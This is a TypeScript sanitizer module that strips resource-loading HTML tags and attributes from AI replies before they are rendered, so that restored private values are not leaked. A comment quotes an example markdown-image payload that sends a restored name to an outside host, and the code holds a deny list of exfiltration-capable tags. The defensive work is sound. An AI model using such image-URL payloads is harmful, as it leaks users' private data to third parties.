import createDOMPurify from 'dompurify';

// The restored view renders the AI's reply as HTML, after the placeholders in
// it have been turned back into the real values. DOMPurify's defaults stop
// scripts but keep everything that *loads* a resource: `<img src>`, `<video>`,
// `<style>` and `style="background:url(…)"`. A reply containing
// `![](https://host/?q=[[NAME_001]])` therefore made the browser request a
// URL carrying the restored name — a network call (hard rule 2) and a leak of
// exactly what the tool exists to protect. The hosted build's CSP blocks it;
// the portable build, the dev server and a self-hosted copy have no headers.
//
// So nothing that fetches on render survives. Links stay: following one is the
// user's own action. An image is replaced by its alt text so the reply still
// reads.
const FETCHING_TAGS = [
  'img', 'picture', 'source', 'video', 'audio', 'track', 'iframe', 'frame', 'object', 'embed',
  'style', 'link', 'svg', 'math', 'form', 'input', 'button', 'textarea', 'select', 'base', 'meta',
];
const FETCHING_ATTRS = ['style', 'src', 'srcset', 'background', 'poster', 'ping', 'action', 'formaction'];

// A private instance, so the hook below cannot affect any other DOMPurify user.
const purify = createDOMPurify();
purify.addHook('uponSanitizeElement', (node, data) => {
  if (data.tagName !== 'img') return;
  const el = node as Element;
  const alt = el.getAttribute('alt');
  if (alt && el.parentNode) el.parentNode.insertBefore(el.ownerDocument.createTextNode(alt), el);
});

/** HTML that is safe to put in the page and on the clipboard: no script, and nothing that loads a resource. */
export const sanitizeRenderedHtml = (html: string): string =>
  purify.sanitize(html, { USE_PROFILES: { html: true }, FORBID_TAGS: FETCHING_TAGS, FORBID_ATTR: FETCHING_ATTRS });
